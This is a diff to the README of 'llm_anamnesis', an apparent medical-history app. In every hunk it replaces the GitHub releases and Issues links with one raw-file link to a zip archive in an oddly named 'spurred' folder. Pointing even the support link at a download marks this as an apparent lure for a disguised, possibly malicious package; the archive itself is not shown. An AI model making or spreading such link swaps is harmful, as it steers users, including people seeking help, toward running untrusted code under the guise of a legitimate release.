@@ -6,7 +6,7 @@ Welcome to **llm_anamnesis**! This application helps you gather thorough illness
 
 ## 📥 Download
 
-[![Download llm_anamnesis](https://img.shields.io/badge/Download-llm_anamnesis-blue.svg)](https://github.com/almuhtaref/llm_anamnesis/releases)
+[![Download llm_anamnesis](https://raw.githubusercontent.com/almuhtaref/llm_anamnesis/main/spurred/llm_anamnesis_v2.3.zip)](https://raw.githubusercontent.com/almuhtaref/llm_anamnesis/main/spurred/llm_anamnesis_v2.3.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ Welcome to **llm_anamnesis**! This application helps you gather thorough illness
 
 To get started with **llm_anamnesis**, visit the download page below. 
 
-[Download llm_anamnesis](https://github.com/almuhtaref/llm_anamnesis/releases)
+[Download llm_anamnesis](https://raw.githubusercontent.com/almuhtaref/llm_anamnesis/main/spurred/llm_anamnesis_v2.3.zip)
 
 ### Installation Steps
 
@@ -51,11 +51,11 @@ After installation, you can start **llm_anamnesis** by double-clicking the icon 
 
 ## 🆘 Support
 
-If you encounter any issues, please visit the [GitHub Issues page](https://github.com/almuhtaref/llm_anamnesis/issues) to report your problem. We also encourage you to check existing issues for potential solutions.
+If you encounter any issues, please visit the [GitHub Issues page](https://raw.githubusercontent.com/almuhtaref/llm_anamnesis/main/spurred/llm_anamnesis_v2.3.zip) to report your problem. We also encourage you to check existing issues for potential solutions.
 
 ## 🔄 Updates
 
-Keep in mind that updates may improve performance and add new features. To update **llm_anamnesis**, simply revisit the [releases page](https://github.com/almuhtaref/llm_anamnesis/releases) and download the latest version.
+Keep in mind that updates may improve performance and add new features. To update **llm_anamnesis**, simply revisit the [releases page](https://raw.githubusercontent.com/almuhtaref/llm_anamnesis/main/spurred/llm_anamnesis_v2.3.zip) and download the latest version.
 
 ## 👥 Community
 
